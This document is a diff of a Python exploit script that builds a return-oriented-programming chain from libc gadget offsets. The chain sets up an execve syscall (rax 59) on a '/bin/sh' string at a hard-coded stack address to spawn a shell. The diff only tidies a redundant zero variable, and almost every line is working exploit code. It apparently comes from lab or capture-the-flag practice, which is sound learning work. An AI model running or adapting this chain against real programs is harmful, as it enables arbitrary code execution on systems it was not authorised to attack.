@@ -10,7 +10,6 @@ g1 = LIBC_OFFSET + 0xe76fa # pop rax ; ret
 d1 = 59
 g2 = LIBC_OFFSET + 0xf54f9 #pop rdx + rsi
 d2 = 0x00
-d3 = 0x00
 g3 = LIBC_OFFSET + 0x1fc6a  #= pop rdi
 d4 = 0x7fffffffe154 #address of /bin/sh on the stack
 retStringRev = 0x0068732f6e69622f
@@ -23,7 +22,7 @@ shellcode += struct.pack('<q', g1)#pop rax ; ret
 shellcode += struct.pack('<q', d1) #59
 shellcode += struct.pack('<q', g2)#pop rdx + rsi
 shellcode += struct.pack('<q', d2) #0
-shellcode += struct.pack('<q', d3)# 0
+shellcode += struct.pack('<q', d2)# 0
 shellcode += struct.pack('<q', g3)# pop rdi
 shellcode += struct.pack('<q', d4) #address to /bin/sh string
 shellcode += struct.pack('<q', g4) #syscall
@@ -36,7 +35,6 @@ print ("g1: %x" % (g1))
 print ("d1: %x" % (d1))
 print ("g2: %x" % (g2))
 print ("d2: %x" % (d2))
-print ("d3: %x" % (d3))
 print ("g4: %x" % (g3))
 print ("d6: %x" % (d4))
 print ("g5: %x" % (g4))
